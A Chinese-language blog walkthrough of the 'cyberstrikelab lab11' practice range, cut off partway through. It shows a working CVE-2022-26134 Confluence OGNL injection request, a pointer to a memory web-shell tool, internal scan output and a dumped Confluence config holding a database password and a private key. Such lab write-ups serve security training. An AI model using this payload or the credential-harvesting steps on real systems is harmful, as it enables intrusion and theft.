<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="信息收集访问8090发现是Confluence   去找一下这个版本的CVE   Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）1234567GET &#x2F;%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exe">
<meta property="og:type" content="article">
<meta property="og:title" content="lab11">
<meta property="og:url" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/index.html">
<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
<meta property="og:description" content="信息收集访问8090发现是Confluence   去找一下这个版本的CVE   Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）1234567GET &#x2F;%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exe">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125200036170.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125200123890.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125200442321.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125201649565.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125202158898.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125202335170.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125204332425.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125204519223.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125205138856.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125210011534.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125210935453.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125213638965.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125215151138.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125224028457.png">
<meta property="og:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125224216112.png">
<meta property="article:published_time" content="2025-11-25T11:59:43.000Z">
<meta property="article:modified_time" content="2025-12-30T15:09:36.744Z">
<meta property="article:author" content="Oceanzbz">
<meta property="article:tag" content="网络安全,CTF,渗透测试">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125200036170.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>lab11</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-QWTJSPQL4F');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/11/26/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab14/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/07/17/Java%E5%AE%89%E5%85%A8/ASM%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&text=lab11"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&is_video=false&description=lab11"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=lab11&body=Check out this article: https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&name=lab11&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&t=lab11"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Confluence-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-26134%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REQ-Roasting"><span class="toc-number">4.</span> <span class="toc-text">AS-REQ Roasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-ESC4"><span class="toc-number">5.</span> <span class="toc-text">ADCS-ESC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-ESC1"><span class="toc-number">6.</span> <span class="toc-text">ADCS-ESC1</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        lab11
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Oceanzbz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-25T11:59:43.000Z" class="dt-published" itemprop="datePublished">2025-11-25</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>访问8090发现是Confluence</p>
<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125200036170.png" class="">

<p>去找一下这个版本的CVE</p>
<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125200123890.png" class="">

<h2 id="Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）"><a href="#Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）" class="headerlink" title="Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）"></a>Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /%<span class="number">24</span>%7B%<span class="number">28</span>%23a%3D%<span class="number">40</span>org.apache.commons.io.IOUtils%40toString%<span class="number">28</span>%40java.lang.Runtime%40getRuntime%<span class="number">28</span>%<span class="number">29.</span><span class="built_in">exec</span>%<span class="number">28</span>%22whoami%<span class="number">22</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%2C%22utf-<span class="number">8</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%40com.opensymphony.webwork.ServletActionContext%40getResponse%<span class="number">28</span>%<span class="number">29.</span>setHeader%<span class="number">28</span>%22X-Cmd-Response%<span class="number">22</span>%2C%23a%<span class="number">29</span>%<span class="number">29</span>%7D/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.3</span><span class="number">.3</span><span class="number">.13</span>:<span class="number">8090</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">97.0</span><span class="number">.4692</span><span class="number">.71</span> Safari/<span class="number">537.36</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125200442321.png" class="">

<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL">https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL</a>  也可以直接用这个工具打内存马</p>
<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125201649565.png" class="">

<p>掏出我的哥斯拉连一下</p>
<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125202158898.png" class="">
<p> 配置下防止连不上</p>
<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125202335170.png" class="">

<p>成功拿到第一个flag</p>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>穿一个fscan上去扫描下内网以及做一下代理使用stowaway</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.5:88 open</span><br><span class="line">10.10.10.22:3306 open</span><br><span class="line">10.10.10.66:445 open</span><br><span class="line">10.10.10.5:445 open</span><br><span class="line">10.10.10.66:139 open</span><br><span class="line">10.10.10.5:139 open</span><br><span class="line">10.10.10.66:135 open</span><br><span class="line">10.10.10.5:135 open</span><br><span class="line">10.10.10.5:80 open</span><br><span class="line">10.10.10.22:22 open</span><br><span class="line">10.10.10.22:8091 open</span><br><span class="line">10.10.10.22:8090 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]10.10.10.66</span><br><span class="line">   [-&gt;]cslab</span><br><span class="line">   [-&gt;]10.10.10.66</span><br><span class="line">[*] WebTitle http://10.10.10.5         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] OsInfo 10.10.10.66	(Windows Server 2016 Standard 14393)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]10.10.10.5</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]10.10.10.5</span><br><span class="line">[*] NetBios 10.10.10.66     cslab.cyberstrike.lab               Windows Server 2016 Standard 14393</span><br><span class="line">[*] OsInfo 10.10.10.5	(Windows Server 2022 Standard 20348)</span><br><span class="line">[*] WebTitle http://10.10.10.22:8090   code:302 len:0      title:None 跳转url: http://10.10.10.22:8090/login.action?os_destination=%2Findex.action&amp;permissionViolation=true</span><br><span class="line">[*] WebTitle http://10.10.10.22:8091   code:204 len:0      title:None</span><br><span class="line">[+] PocScan http://10.10.10.5 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">[*] WebTitle http://10.10.10.22:8090/login.action?os_destination=%2Findex.action&amp;permissionViolation=true code:200 len:37155  title:登录 - Confluence</span><br><span class="line">[+] InfoScan http://10.10.10.22:8090/login.action?os_destination=%2Findex.action&amp;permissionViolation=true [ATLASSIAN-Confluence]</span><br></pre></td></tr></table></figure>

<p>先找下配置文件去看看数据库密码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">cat /data/wiki/confluence/confluence.cfg.xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">confluence-configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setupStep</span>&gt;</span>complete<span class="tag">&lt;/<span class="name">setupStep</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setupType</span>&gt;</span>custom<span class="tag">&lt;/<span class="name">setupType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">buildNumber</span>&gt;</span>8703<span class="tag">&lt;/<span class="name">buildNumber</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;admin.ui.allow.daily.backup.custom.location&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;admin.ui.allow.manual.backup.download&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;admin.ui.allow.site.support.email&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;atlassian.license.message&quot;</span>&gt;</span>AAABgA0ODAoPeJxtUU1vozAQvftXIO2xIjXQAIlkaRPwtpEgSZuQ3eRm6CRYCwbZJl349UsJvbSV5 uL35Hkf82PfgBGz1sCugR/meDp3ZgYN94aN7SkKJDDNKxEyDeQdMXE/LqJXVjQDQ86sUIBCUJnk9 YAkouAl1/BqFDwDocBIWyPXulbz+/su5wVMeIU28sIEV7clX9isEucJyzS/AtGyARRUQvdvGjNek K7rfqZpOsmqEo0aT0zlJA7egl9PZdrFYNd8263a39p/9OrAs5M/p6Jb5M9rvY/D1yZ+ZnfyEMIlo cdjGtmP1/ZCyE12p5nUIMdkAxTdRPZtDWtWAgk2cUxfgtUiQr0hoUEwkQH9V3PZjl35MxN7/aDx7 yok0Src0bUZWd6DO7V8z5lhx0c7kFeQPb1c2jNzSw8nMzm5S5NuXYr+QnsAqd47slyMPew7jvWx8 nu9bSOznCn4fLOxqI919i3ZuilTkJtzonqcmBbqHZJvXI79D+mHK/0H7Oa5FzAsAhQuYZcnjQl9D MmNlMa6f1tdRt8sVQIUVnDQ9RBPBsMJ1wdKCAl7xVMCbcw=X02im<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;attachments.dir&quot;</span>&gt;</span>$&#123;confluenceHome&#125;/attachments<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;confluence.setup.locale&quot;</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;confluence.setup.server.id&quot;</span>&gt;</span>BB29-PEVZ-UZ6B-EP6E<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;confluence.webapp.context.path&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.c3p0.acquire_increment&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.c3p0.idle_test_period&quot;</span>&gt;</span>100<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.c3p0.max_size&quot;</span>&gt;</span>60<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.c3p0.max_statements&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.c3p0.min_size&quot;</span>&gt;</span>20<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.c3p0.timeout&quot;</span>&gt;</span>30<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.c3p0.validate&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.driver_class&quot;</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.isolation&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.password&quot;</span>&gt;</span>confdsdgfd<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.url&quot;</span>&gt;</span>jdbc:mysql://localhost/confluence<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.username&quot;</span>&gt;</span>confluenceuser<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.database.lower_non_ascii_supported&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.dialect&quot;</span>&gt;</span>com.atlassian.confluence.impl.hibernate.dialect.MySQLDialect<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.setup&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jwt.private.key&quot;</span>&gt;</span>MIIG/gIBADANBgkqhkiG9w0BAQEFAASCBugwggbkAgEAAoIBgQCyT3OfV1ZvXitTjIcgygZgzDXipmikVpb2PEXa3yjct59hqlnscnlglMJwMPoz007ufkF0bngI/rxgJT/EvSF4HRXv+pxwOAF7KbgwlM/xf6/p5ZVhMVg1D4j5W2xl9PC60zd74n7Su8p2LJjmQeWZFyVG6Xd3dcU1yEjfyjETZDWqHswiccptRx3qioOPXOZkaI0N8aMX/KqQroFqwACSDvuxGHSYMSESz5aCQ+35vWHmV4jXpc+lp6/QgwRXJrHeAAhTqkKioOv1i2bPFsrRRkLKJXzNJt/+X+v2Iv0j0H8cBBEkHCXRKkbthXA0QbW4Zy2r4HJHB8wke4xDk08QtuKHuQRPuAQMzBqgGlwgGEKmEkZLWFknNjTHTTFpSJ32ma7p4Js/a7NM7KfeZcUdWtLuSuSfA7uhELU9TwRZt4MFoD7VLHxoXuBzHFpBZz5HrCTXBH3shbBnfPn8BA2cAQYp6xNeXb2gJgC8nEIlI1znx/SmzjYb8IQjbMVwu18CAwEAAQKCAYAnU2qWu/ZuPYCkvpuW2beqZZ+Ey1rM0+QbjpOBgDJM65qVObL3eQ/YAzcW81ZbU8FWzDW3bh2/Lh9xvQVhaK0XBqMt+EHEZjW9aigbXta11ol/tojJlM51dWWqSUWQ/wKQ0cCs6/k4lP5ELfXS4rm2l+o6x4b3q9vAztlzse487p7/VCeFeT9B9qtcbQwy9DRD9OMXLjHgOnOL0VDtsEbv76oHFvOwFTXMJkh1lnHH4MLUwH2HwiQXzvHxtNOiPQAiSLNDaDOEGlhEpiPKknpPXut1W01vGIT400T4C03StxrtGooeXNZQK/aHD38hT0/WFhxaYrBAOHkmOKbvLn7xpclYkcbfPWATFiOjTmeAfNRh5/ImYwUTIafBNl+Wy+NJKEVoACCaqKGeQZMtvCabTlyPIdtjCFC/s038FXtIHdcdyJIbxwloPBW2Zr8b2OrvkgBZ1abeFdJGYBXuzc1ueI/r1DNZB/M+wGRVQvPzSfkH+rT7oQ/hiyknUveT49ECgcEA94GtB5aESCcM0FFl9tvteTItDEpjmg2Je5Ovi7JLsv9apkbDSIY/cFC9X5kn3XeLP9LYpo78UbiF3cAMsNmo1psBcnXeXV98MpGK0AsFtXhxF9Q8VkTHFCL4IfiI999+/Q2UDPDGHOHKjZDJUowxeyGroJlr0t7ScesVyJoVwGIk25dk8br1i6ASSx7GdDbyFyLqgQsP2HiecqqHmRDhtlBoipTvo/WnoZu378bzxPa2nD4/jtJiNxsucPT/jbENAoHBALht5KEQ0pMMcb4RgeCDm3Xh8nSotpxybMSb4zvInVsNDHCKsucdzg96l5BLvlFcuY3VgIvn9eynWLgfwnRFkRzNJwBOvckuJE5yaRsDfffHKGYs